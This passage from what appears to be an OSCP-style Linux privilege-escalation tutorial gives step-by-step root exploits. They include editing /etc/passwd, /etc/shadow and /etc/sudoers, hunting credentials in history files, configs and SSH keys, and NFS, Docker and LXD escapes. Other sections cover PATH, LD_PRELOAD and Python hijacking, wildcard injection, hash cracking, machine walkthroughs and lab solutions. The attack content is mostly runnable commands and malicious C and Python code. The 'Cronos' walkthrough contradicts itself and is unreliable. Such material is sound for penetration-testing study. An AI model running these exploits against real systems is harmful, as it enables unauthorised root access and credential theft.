# 5. Root!
id
# uid=0(evil) gid=0(root)
```

**Alternative: Remove root password**:

```bash
# Original /etc/passwd line:
# root:x:0:0:root:/root:/bin/bash

# Edit to remove password (replace 'x' with empty)
sed -i 's/^root:x:/root::/g' /etc/passwd

# Login as root without password
su root
# No password required!
```

### 9.3 Exploiting Writable /etc/shadow

```bash
# 1. Check if writable
ls -la /etc/shadow

# 2. Generate new password hash
openssl passwd -6 -salt xyz password123
# Output: $6$xyz$LONGHASH

# 3. Replace root's password hash
# Original line:
# root:$6$OLD_HASH:18000:0:99999:7:::

# Replace with new hash
sed -i 's|^root:[^:]*:|root:$6$xyz$NEWHASH:|' /etc/shadow

# 4. Login as root
su root
# Password: password123
```

### 9.4 Exploiting Writable /etc/sudoers

```bash
# If /etc/sudoers is writable (rare but happens)
ls -la /etc/sudoers

# Add yourself to sudoers
echo 'john ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# Become root
sudo su
```

---

## 10. Pillar 7: Password Hunting

### 10.1 The Art of Credential Discovery

Passwords are everywhere in Linux systems if you know where to look. Finding plaintext credentials is one of the easiest privilege escalation vectors.

**Common Password Locations**:
1. Configuration files
2. History files
3. Scripts
4. Database files
5. Backup files
6. Log files
7. Environment variables
8. Process memory

### 10.2 History Files

```bash
# Bash history (most common)
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history

# Other shells
cat ~/.zsh_history
cat ~/.sh_history
cat ~/.mysql_history
cat ~/.python_history
cat ~/.php_history
cat ~/.nano_history
cat ~/.atftp_history

# Find all history files
find / -name "*_history" 2>/dev/null
find /home -name "*_history" 2>/dev/null

# Search history for passwords
grep -i "pass" ~/.bash_history
grep -E "(password|passwd|pwd)" ~/.bash_history
```

**Example Finding**:
```bash
$ cat ~/.bash_history
mysql -u root -p
MySecretPassword123
ssh admin@192.168.1.10
su root
RootPassword456!
```

### 10.3 Configuration Files

```bash
# Web application configs
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
find /var/www -name "config*.php" -exec grep -i "password" {} \; 2>/dev/null

# Database configs
cat /etc/mysql/my.cnf
cat ~/.my.cnf
cat /etc/postgresql/*/main/pg_hba.conf

# Application configs
find / -name "*.conf" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.config" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.ini" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# Common application directories
cat /opt/*/config/*
cat /usr/local/*/config/*
```

**Example: WordPress wp-config.php**:
```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'SuperSecretDBPass123');
define('DB_HOST', 'localhost');
```

**Exploitation**:
```bash
# Try password for other users
su root
# Password: SuperSecretDBPass123
# Users often reuse passwords!
```

### 10.4 SSH Keys

```bash
# Private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Readable private keys
find / -name "id_rsa" -perm -004 2>/dev/null

# SSH directories
ls -la ~/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# Authorized keys (tells you who can SSH in)
cat ~/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

**Exploitation**:
```bash
# Found readable private key
cat /home/alice/.ssh/id_rsa

# Copy to attacker machine
# On victim:
cat /home/alice/.ssh/id_rsa
# Copy output

# On attacker:
cat > alice_id_rsa
# Paste key
chmod 600 alice_id_rsa

# SSH as alice from anywhere
ssh -i alice_id_rsa alice@target

# Try to use key for other users
ssh -i alice_id_rsa root@localhost
```

### 10.5 Environment Variables

```bash
# Current environment
env
env | grep -i pass
env | grep -i pwd
env | grep -i key

# Other users' environments (from /proc)
cat /proc/*/environ | tr '\0' '\n'
strings /proc/*/environ | grep -i pass

# Check common variables
echo $PASSWORD
echo $DB_PASSWORD
echo $MYSQL_PWD
echo $DATABASE_URL
```

### 10.6 Scripts and Source Code

```bash
# Find scripts
find / -name "*.sh" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.py" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.pl" 2>/dev/null | xargs grep -i "password" 2>/dev/null
find / -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# Backup scripts often contain credentials
cat /usr/local/bin/backup.sh
cat /opt/backup/*.sh

# Look for hardcoded credentials
grep -r "password=" / 2>/dev/null
grep -r "pwd=" / 2>/dev/null
grep -r "passwd=" / 2>/dev/null
```

**Example Finding**:
```bash
$ cat /opt/backup/db_backup.sh
#!/bin/bash
mysqldump -u root -pRootDBPassword123 wordpress > /backups/wp.sql
```

### 10.7 Database Files

```bash
# Find database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
find / -name "*.sqlite3" 2>/dev/null
find / -name "*.sql" 2>/dev/null

# Dump SQLite databases
sqlite3 database.db .dump

# Search for passwords in databases
strings database.db | grep -i password
```

### 10.8 Log Files

```bash
# Authentication logs
cat /var/log/auth.log | grep -i "password"
cat /var/log/secure | grep -i "password"

# Application logs
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log
cat /var/log/mysql/mysql.log

# Custom application logs
find /var/log -type f -exec grep -i "password" {} \; 2>/dev/null
```

### 10.9 Backup Files

```bash
# Find backup files
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*~" 2>/dev/null

# Common backup locations
ls -la /backups/
ls -la /var/backups/
ls -la /tmp/*.bak

# Database backups
find / -name "*.sql" 2>/dev/null
find / -name "*.sql.gz" 2>/dev/null
```

### 10.10 Memory Dumps and Core Files

```bash
# Core dumps
find / -name "core" 2>/dev/null
find / -name "core.*" 2>/dev/null

# Extract strings from core dumps
strings /var/crash/core.12345 | grep -i password
```

### 10.11 Password Hunting Checklist

```bash
#!/bin/bash
# Comprehensive Password Hunt

echo "[*] Checking history files..."
find / -name "*_history" 2>/dev/null | xargs grep -i "password\|passwd\|pwd" 2>/dev/null

echo "[*] Checking config files..."
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -i "password" 2>/dev/null

echo "[*] Checking SSH keys..."
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

echo "[*] Checking scripts..."
find / -name "*.sh" -o -name "*.py" -o -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null

echo "[*] Checking databases..."
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null

echo "[*] Checking backups..."
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null

echo "[*] Checking environment..."
env | grep -i "pass\|pwd\|key"

echo "[*] Done!"
```

---

## 11. Pillar 8: NFS Exploitation

### 11.1 Understanding NFS

**NFS** (Network File System) allows remote file access over the network.

**The Vulnerability**: `no_root_squash` option allows remote root users to create files as root on the NFS share.

```
┌────────────────────────────────────────────────────────────┐
│            NFS ROOT SQUASHING EXPLANATION                  │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Normal NFS (root_squash - SECURE):                       │
│  ┌──────────────────────────────────────┐                │
│  │ Attacker (UID 0 on attacker box)     │                │
│  │         ↓                            │                │
│  │ Creates file on NFS share            │                │
│  │         ↓                            │                │
│  │ File is owned by nobody (UID 65534)  │                │
│  │ (root is "squashed" to nobody)       │                │
│  └──────────────────────────────────────┘                │
│                                                            │
│  NFS with no_root_squash (VULNERABLE):                    │
│  ┌──────────────────────────────────────┐                │
│  │ Attacker (UID 0 on attacker box)     │                │
│  │         ↓                            │                │
│  │ Creates file on NFS share            │                │
│  │         ↓                            │                │
│  │ File is owned by root (UID 0)!       │                │
│  │ Can create SUID binaries as root!    │                │
│  └──────────────────────────────────────┘                │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### 11.2 Finding NFS Shares

**On the victim machine**:
```bash
# Check /etc/exports
cat /etc/exports

# Example vulnerable entry:
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
#             ↑ VULNERABLE!

# Show mounted NFS shares
showmount -e localhost
showmount -e 192.168.1.10

# Check what's currently mounted
mount | grep nfs
df -h | grep nfs
```

### 11.3 NFS Exploitation Method 1: SUID Binary

**Scenario**: NFS share with `no_root_squash` accessible from your attacking machine.

**Step 1: On Victim - Discover NFS**:
```bash
cat /etc/exports
# /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

showmount -e 192.168.1.10
# Export list for 192.168.1.10:
# /tmp *
```

**Step 2: On Attacker - Mount NFS**:
```bash
# Create mount point
mkdir /tmp/victim_nfs

# Mount the share
mount -o rw 192.168.1.10:/tmp /tmp/victim_nfs

# Verify mounted
df -h | grep victim_nfs
```

**Step 3: On Attacker - Create SUID Binary**:
```bash
# Method 1: Copy bash
cp /bin/bash /tmp/victim_nfs/rootbash
chmod +s /tmp/victim_nfs/rootbash

# Method 2: Create custom binary
cat > shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc shell.c -o /tmp/victim_nfs/shell
chmod +s /tmp/victim_nfs/shell
```

**Step 4: On Victim - Execute SUID Binary**:
```bash
# Check ownership
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1234567 Jan 24 10:00 /tmp/rootbash

# Execute
/tmp/rootbash -p

# Root shell!
id
# uid=1000(john) gid=1000(john) euid=0(root) egid=0(root)
```

### 11.4 NFS Exploitation Method 2: Writable System Files

If NFS exports a system directory like `/root` or `/etc`, you can directly modify system files.

```bash
# If /etc is exported with no_root_squash
mount -o rw 192.168.1.10:/etc /tmp/victim_etc

# Add root user to passwd
echo 'evil:$1$evil$IH4izTm9bAzkBOD2WRDlb1:0:0:pwned:/root:/bin/bash' >> /tmp/victim_etc/passwd

# On victim
su evil
# Password: password123
```

---

## 12. Pillar 9: Container Escapes

### 12.1 Docker Group Exploitation

If your user is in the `docker` group, you have root-equivalent access.

```bash
# Check groups
id
# uid=1000(john) gid=1000(john) groups=1000(john),999(docker)
#                                                  ↑ JACKPOT!

# List docker images
docker images

# Method 1: Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# You're now root on the HOST system!
id
# uid=0(root) gid=0(root)

# Method 2: Use existing image
docker run -v /:/hostfs --rm -it ubuntu bash
cd /hostfs
cat /hostfs/etc/shadow

# Method 3: Privileged container
docker run --privileged --rm -it ubuntu bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cd /mnt/host
# Full host filesystem access!
```

**Complete Docker Escape Example**:
```bash
# 1. Verify docker group membership
groups
# john docker

# 2. Check available images
docker images
# REPOSITORY   TAG      IMAGE ID
# alpine       latest   abc123def456

# 3. Launch privileged container with host filesystem mounted
docker run -v /:/hostfs -it alpine sh

# 4. Inside container (as root)
cd /hostfs
cat /hostfs/etc/shadow
# Now you can read any file!

# 5. Get persistent root
cat /hostfs/root/.ssh/id_rsa > /tmp/root_key
# Or create SUID binary
cp /hostfs/bin/bash /hostfs/tmp/rootbash
chmod +s /hostfs/tmp/rootbash

# 6. Exit container and execute on host
exit
/tmp/rootbash -p
# Root shell on host!
```

### 12.2 LXC/LXD Group Exploitation

Similar to Docker, `lxd` group membership = root.

```bash
# Check groups
id
# groups=1000(john),116(lxd)
#                    ↑ VULNERABLE!

# Method 1: Alpine image build (on attacker)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# Transfer alpine-*.tar.gz to victim

# On victim
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list

# Create container
lxc init myimage mycontainer -c security.privileged=true

# Mount host filesystem
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# Start and access
lxc start mycontainer
lxc exec mycontainer /bin/sh

# Inside container
cd /mnt/root
# Full host filesystem access as root!
```

**Quick LXD Root Method**:
```bash
# On victim (if lxd is already initialized)
lxc init ubuntu:18.04 mycontainer -c security.privileged=true
lxc config device add mycontainer host-root disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer -- /bin/bash
cd /mnt/root/root
cat .ssh/id_rsa
```

### 12.3 Disk Group Exploitation

The `disk` group can read/write to raw disk devices.

```bash
# Check groups
id
# groups=1000(john),6(disk)

# List block devices
lsblk

# Read entire disk (including /etc/shadow)
debugfs /dev/sda1
debugfs: cat /etc/shadow
# Root hash displayed!

# Alternative: dd to read files
dd if=/dev/sda1 | strings | grep "root:"

# Write to disk (DANGEROUS)
# Can overwrite /etc/passwd directly on disk
```

### 12.4 Video Group Exploitation

The `video` group can access framebuffer to capture screen.

```bash
# Capture screenshot
cat /dev/fb0 > /tmp/screenshot.raw

# Convert to viewable format
# Transfer to attacker and use imagemagick:
convert -size 1920x1080 -depth 8 rgba:screenshot.raw screenshot.png
```

---

## 13. PATH Hijacking Techniques

### 13.1 Understanding PATH

The `PATH` environment variable tells the shell where to look for commands.

```bash
# View current PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# When you type "ls", shell searches:
# 1. /usr/local/sbin/ls
# 2. /usr/local/bin/ls
# 3. /usr/sbin/ls
# 4. /usr/bin/ls ← Found! Executes this
# 5. /sbin/ls
# 6. /bin/ls
```

**The Vulnerability**: If a program calls a command without a full path (e.g., `ls` instead of `/bin/ls`), we can hijack it by manipulating PATH.

### 13.2 PATH Hijacking Scenarios

#### Scenario 1: SUID Binary with Relative Path

```bash
# Find SUID binary
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/sys-info

# Check what it calls
strings /usr/local/bin/sys-info
# ...
# ifconfig
# netstat
# ...

# Calls "ifconfig" without /sbin/ifconfig!

# Exploit
echo '/bin/bash -p' > /tmp/ifconfig
chmod +x /tmp/ifconfig
export PATH=/tmp:$PATH
/usr/local/bin/sys-info
# Root shell!
```

#### Scenario 2: Sudo with Custom PATH

```bash
# Check sudo permissions
sudo -l
# Matching Defaults entries:
#     env_keep+=PATH
# (root) NOPASSWD: /usr/local/bin/service-check

# Binary calls "systemctl" without full path
strings /usr/local/bin/service-check
# systemctl status apache2

# Exploit
echo '/bin/bash' > /tmp/systemctl
chmod +x /tmp/systemctl
export PATH=/tmp:$PATH
sudo /usr/local/bin/service-check
# Root shell!
```

#### Scenario 3: Cron Job with Writable PATH Directory

```bash
# Cron has custom PATH
cat /etc/crontab
# PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin
# */5 * * * * root /usr/local/bin/cleanup.sh

# cleanup.sh calls "tar" without full path
cat /usr/local/bin/cleanup.sh
# tar -czf /backups/data.tar.gz /data

# /home/user/bin is writable and in PATH!
echo '#!/bin/bash' > /home/user/bin/tar
echo 'cp /bin/bash /tmp/rootbash' >> /home/user/bin/tar
echo 'chmod +s /tmp/rootbash' >> /home/user/bin/tar
chmod +x /home/user/bin/tar

# Wait for cron, then:
/tmp/rootbash -p
```

---

## 14. LD_PRELOAD and LD_LIBRARY_PATH Exploitation

### 14.1 Understanding LD_PRELOAD

`LD_PRELOAD` allows you to load a shared library before all others. If sudo preserves this variable, you can inject malicious code.

```
┌────────────────────────────────────────────────────────┐
│              LD_PRELOAD EXPLOITATION                   │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Normal Program Execution:                             │
│  program → libc.so → system libraries → execute       │
│                                                        │
│  With LD_PRELOAD:                                      │
│  program → YOUR_MALICIOUS.so → libc.so → execute      │
│              ↑ Runs your code FIRST!                   │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### 14.2 Checking for LD_PRELOAD Vulnerability

```bash
# Check sudo configuration
sudo -l
# Output should show:
# env_keep+=LD_PRELOAD

# Or check sudoers
sudo cat /etc/sudoers | grep LD_PRELOAD
```

### 14.3 LD_PRELOAD Exploitation

**Step 1: Create Malicious Library**:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash -p");
}
```

**Step 2: Compile**:

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

**Step 3: Exploit** (assuming you can sudo any command):

```bash
# Use any sudo-allowed command
sudo LD_PRELOAD=/tmp/shell.so find

# Or
sudo LD_PRELOAD=/tmp/shell.so apache2

# Root shell spawns!
```

**Complete Example**:

```bash
# 1. Check sudo permissions
sudo -l
# env_keep+=LD_PRELOAD
# (ALL) NOPASSWD: /usr/bin/find

# 2. Create malicious library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# 3. Compile
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 4. Exploit
sudo LD_PRELOAD=/tmp/shell.so find

# 5. Root shell!
root@victim:/# id
uid=0(root) gid=0(root)
```

### 14.4 LD_LIBRARY_PATH Exploitation

Similar concept but hijacks library loading path.

```bash
# Check sudo permissions
sudo -l
# env_keep+=LD_LIBRARY_PATH

# Find which libraries a program uses
ldd /usr/sbin/apache2
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1

# Create malicious library with same name
cat > libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
EOF

# Compile
gcc -shared -fPIC -o libcrypt.so.1 libcrypt.c

# Exploit
sudo LD_LIBRARY_PATH=. apache2

# Execute SUID bash
/tmp/bash -p
```

---

## 15. Shared Library Injection

### 15.1 Understanding Shared Libraries

Programs can be vulnerable if they load libraries from insecure locations.

```bash
# Check what libraries a binary loads
ldd /usr/local/bin/custom_app

# Check where it looks for libraries
strace /usr/local/bin/custom_app 2>&1 | grep -i "open"
```

### 15.2 Exploitation: Writable Library Path

If a SUID binary loads libraries from a writable location:

```bash
# SUID binary searches for library
strace /usr/local/sbin/custom 2>&1 | grep ".so"
# open("/home/user/lib/libcustom.so", O_RDONLY) = -1 ENOENT
#      ↑ Looks here first!

# /home/user/lib is writable!
mkdir -p /home/user/lib

# Create malicious library
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /home/user/lib/libcustom.so /tmp/libcustom.c

# Run SUID binary
/usr/local/sbin/custom
# Root shell!
```

---

## 16. Python Library Hijacking

### 16.1 Python Path Exploitation

Python searches for modules in specific directories (PYTHONPATH).

```bash
# View Python path
python3 -c "import sys; print('\n'.join(sys.path))"
```

### 16.2 Hijacking Python Modules

**Scenario**: Script running as root imports Python module from writable location.

```bash
# Find Python script run by root (cron, SUID, etc.)
cat /usr/local/bin/admin_tool.py
#!/usr/bin/python3
import os
import mymodule  # Custom module

mymodule.do_admin_stuff()

# Check where Python looks for mymodule
python3 -c "import sys; print(sys.path)"
# ['', '/usr/lib/python3.8', '/home/user/lib/python']
#  ↑ Current directory first!

# Create malicious mymodule.py in current directory
cat > mymodule.py << 'EOF'
import os

def do_admin_stuff():
    os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF

# Run the script
sudo /usr/local/bin/admin_tool.py

# SUID bash created
/tmp/rootbash -p
```

### 16.3 Python Input() Hijacking (Python 2)

In Python 2, `input()` evaluates code!

```bash
# If script uses input()
cat script.py
name = input("Enter name: ")
print("Hello, " + name)

# Exploit
python2 script.py
# Enter: __import__('os').system('/bin/bash')
# Shell spawns!
```

---

## 17. Environment Variables Exploitation

### 17.1 $PATH Manipulation

Already covered in section 13.

### 17.2 IFS (Internal Field Separator) Exploitation

```bash
# IFS separates words in shell
# Default: space, tab, newline

# Vulnerable script
cat vulnerable.sh
#!/bin/bash
echo $PATH

# Exploit by changing IFS
IFS='/' /bin/sh -c 'echo $0'
# If /bin/sh is SUID, this can be exploited
```

### 17.3 Shell Functions

```bash
# Define function with same name as command
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# If SUID binary calls "service" through system()
/vulnerable_suid_binary
# Root shell!
```

---

## 18. Wildcard Injection Attacks

### 18.1 TAR Wildcard Injection

Already covered in section 8.6, but here's more detail:

```bash
# Vulnerable cron
*/5 * * * * root cd /home/user && tar -czf /backup/backup.tar.gz *

# Create exploit files
cd /home/user
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash' >> shell.sh
echo 'chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Wait for cron
```

### 18.2 CHOWN Wildcard Injection

```bash
# Vulnerable cron
*/5 * * * * root chown root:root /data/*

# Exploit
cd /data
touch -- '--reference=/root/.ssh/id_rsa'
ln -s /etc/passwd file

# After cron runs, /etc/passwd might have changed ownership
```

### 18.3 RSYNC Wildcard Injection

```bash
# Vulnerable cron
*/5 * * * * root rsync -a /data/* /backup/

# Exploit
cd /data
echo '#!/bin/bash' > shell.sh
echo '/bin/bash -p' >> shell.sh
chmod +x shell.sh
touch -- '-e sh shell.sh'

# Rsync will execute shell.sh
```

---

## 19. Exploiting Readable /etc/shadow

### 19.1 Reading /etc/shadow

```bash
# Check if readable
ls -la /etc/shadow
# -rw-r--r-- 1 root shadow 1234 Jan 24 10:00 /etc/shadow
#       ↑ World-readable!

# Read it
cat /etc/shadow
```

### 19.2 Extracting and Cracking Hashes

```bash
# Extract root hash
grep "^root:" /etc/shadow
# root:$6$xyz$LONGHASH:18000:0:99999:7:::

# Copy hash to file
echo '$6$xyz$LONGHASH' > root_hash.txt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt

# Or Hashcat
hashcat -m 1800 root_hash.txt /usr/share/wordlists/rockyou.txt

# Once cracked
su root
# Password: <cracked_password>
```

### 19.3 Understanding Hash Formats

```
$1$salt$hash     = MD5
$2a$salt$hash    = Blowfish
$5$salt$hash     = SHA-256
$6$salt$hash     = SHA-512
$y$salt$hash     = yescrypt
```

---

## 20. Exploiting Writable /etc/passwd

Already covered in section 9.2, but here's the expanded version with more methods:

### 20.1 Adding New Root User

```bash
# Generate password hash
openssl passwd -1 -salt evil password123
# $1$evil$IH4izTm9bAzkBOD2WRDlb1

# Add to /etc/passwd
echo 'evil:$1$evil$IH4izTm9bAzkBOD2WRDlb1:0:0:pwned:/root:/bin/bash' >> /etc/passwd

# Login
su evil
```

### 20.2 Removing Root Password

```bash
# Edit root line in /etc/passwd
# Change: root:x:0:0:root:/root:/bin/bash
# To:     root::0:0:root:/root:/bin/bash
#              ↑ Empty password!

sed -i 's/^root:x:/root::/g' /etc/passwd

# Login without password
su root
```

### 20.3 Changing Your UID to 0

```bash
# Original line
john:x:1000:1000:John Doe:/home/john:/bin/bash

# Change to
john:x:0:1000:John Doe:/home/john:/bin/bash
#        ↑ UID 0 = root!

sed -i 's/^john:x:1000:/john:x:0:/g' /etc/passwd

# Logout and login again
exit
ssh john@localhost
id
# uid=0(root) gid=1000(john)
```

---

## 21. Real-World OSCP Scenarios

### 21.1 Scenario 1: Sudo Python Library Hijacking

**Machine**: OSCP Practice Lab

**Initial Access**: Web shell as www-data

```bash
# Enumeration
www-data@victim:/$ sudo -l
User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py

# Check backup.py
www-data@victim:/$ cat /opt/scripts/backup.py
#!/usr/bin/python3
import zipfile
import os

# Create backup
zipfile.ZipFile('/backups/site.zip', 'w')

# Check Python path
www-data@victim:/$ python3 -c "import sys; print(sys.path)"
['', '/usr/lib/python3.8', '/opt/scripts']

# /opt/scripts is writable!
www-data@victim:/$ ls -la /opt/scripts
drwxrwxrwx 2 root root 4096 Jan 24 10:00 .

# Create malicious zipfile.py
www-data@victim:/$ cat > /opt/scripts/zipfile.py << 'EOF'
import os
os.system('chmod +s /bin/bash')
EOF

# Run script with sudo
www-data@victim:/$ sudo /usr/bin/python3 /opt/scripts/backup.py

# Bash is now SUID
www-data@victim:/$ /bin/bash -p
root@victim:/# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

### 21.2 Scenario 2: Cron + Wildcard Injection

**Machine**: HTB "Cronos"

```bash
# Find writable directory with cron job
user@cronos:/$ cat /etc/crontab
*/5 * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

# Check /var/www/laravel permissions
user@cronos:/$ ls -la /var/www/laravel
drwxrwxrwx 10 www-data www-data 4096 Jan 24 10:00 .

# artisan file readable
user@cronos:/$ cat /var/www/laravel/artisan
#!/usr/bin/env php
...

# We can't modify artisan, but we can create a file that hijacks the path
# Create malicious artisan
user@cronos:/$ cat > /var/www/laravel/shell.php << 'EOF'
<?php
system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
?>
EOF

# Wait and monitor
user@cronos:/$ watch -n 1 ls -la /tmp/rootbash
# After cron runs...

user@cronos:/$ /tmp/rootbash -p
root@cronos:/# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```

### 21.3 Scenario 3: Docker Group Escape

**Machine**: HTB "Falafel"

```bash
# Initial access
yossi@falafel:/$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd),116(docker)

# Docker group = root
yossi@falafel:/$ docker images
REPOSITORY   TAG       IMAGE ID
ubuntu       latest    abc123def456

# Exploit
yossi@falafel:/$ docker run -v /:/hostfs -it ubuntu bash
root@container:/# cd /hostfs/root
root@container:/# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
...

# Copy key and SSH as root
```

### 21.4 Scenario 4: SUID Custom Binary PATH Hijacking

**Machine**: HTB "Beep"

```bash
# Find custom SUID
asterisk@beep:/$ find / -perm -4000 2>/dev/null
/usr/local/bin/nmap  # nmap 3.81 - has interactive mode!

# Exploit
asterisk@beep:/$ /usr/local/bin/nmap --interactive
nmap> !sh
sh-3.2# id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
```

### 21.5 Scenario 5: Capabilities PrivEsc

**Machine**: OSCP Practice

```bash
# Enumeration
user@victim:/$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep

# Exploit
user@victim:/$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@victim:/# id
uid=0(root) gid=1000(user)
```

---

## 22. Hands-On Labs

### Lab 1: Sudo GTFOBins Exploitation

**Objective**: Exploit misconfigured sudo to gain root.

**Setup**:
```bash
# As root, create vulnerable user
sudo useradd -m labuser
echo 'labuser ALL=(ALL) NOPASSWD: /usr/bin/vim' >> /etc/sudoers

# Switch to labuser
su - labuser
```

**Challenge**: Escalate to root using sudo permissions.

**Solution**:
```bash
# Check sudo permissions
sudo -l
# (root) NOPASSWD: /usr/bin/vim

# Exploit via GTFOBins
sudo vim -c ':!/bin/bash'

# Verify root
id
# uid=0(root)
```

**Variations**:
- Try with `/usr/bin/find`
- Try with `/usr/bin/less`
- Try with `/usr/bin/awk`

---

### Lab 2: SUID Binary PATH Hijacking

**Objective**: Exploit SUID binary that calls commands without full paths.

**Setup**:
```bash
# Create vulnerable SUID binary
cat > /tmp/vuln.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("ps");
    return 0;
}
EOF

gcc /tmp/vuln.c -o /usr/local/bin/sysinfo
chmod +s /usr/local/bin/sysinfo
```

**Challenge**: Exploit PATH hijacking to gain root.

**Solution**:
```bash
# Create malicious ps
echo '#!/bin/bash' > /tmp/ps
echo '/bin/bash -p' >> /tmp/ps
chmod +x /tmp/ps

# Hijack PATH
export PATH=/tmp:$PATH

# Execute SUID binary
/usr/local/bin/sysinfo

# Root shell!
```

---

### Lab 3: Cron Job Writable Script

**Objective**: Exploit writable cron script.

**Setup**:
```bash
# Create cron job
cat >> /etc/crontab << 'EOF'
*/2 * * * * root /usr/local/bin/backup.sh
EOF

# Create writable script
cat > /usr/local/bin/backup.sh << 'EOF'
#!/bin/bash
echo "Backup started at $(date)" >> /var/log/backup.log
EOF

chmod 777 /usr/local/bin/backup.sh
```

**Challenge**: Modify script to gain root.

**Solution**:
```bash
# Append malicious code
echo 'cp /bin/bash /tmp/rootbash' >> /usr/local/bin/backup.sh
echo 'chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh

# Wait for cron (2 minutes max)
watch -n 10 ls -la /tmp/rootbash

# Execute
/tmp/rootbash -p
id
# uid=1000 euid=0(root)
```

---

### Lab 4: Capabilities Exploitation

**Objective**: Exploit CAP_SETUID capability.

**Setup**:
```bash
# Set capability on python
sudo setcap cap_setuid+ep /usr/bin/python3.8
```

**Challenge**: Use capability to become root.

**Solution**:
```bash
# Find capability
getcap -r / 2>/dev/null | grep cap_setuid
# /usr/bin/python3.8 = cap_setuid+ep

# Exploit
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Verify
id
# uid=0(root)
```

---

### Lab 5: NFS no_root_squash Exploitation

**Objective**: Exploit NFS share to create SUID binary.

**Setup** (on server):
```bash
# Configure NFS export
echo '/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)' >> /etc/exports
exportfs -a
systemctl restart nfs-server
```

**Challenge**: Exploit from client machine to gain root on server.

**Solution** (on client as root):
```bash
# Mount NFS share
mkdir /mnt/nfs
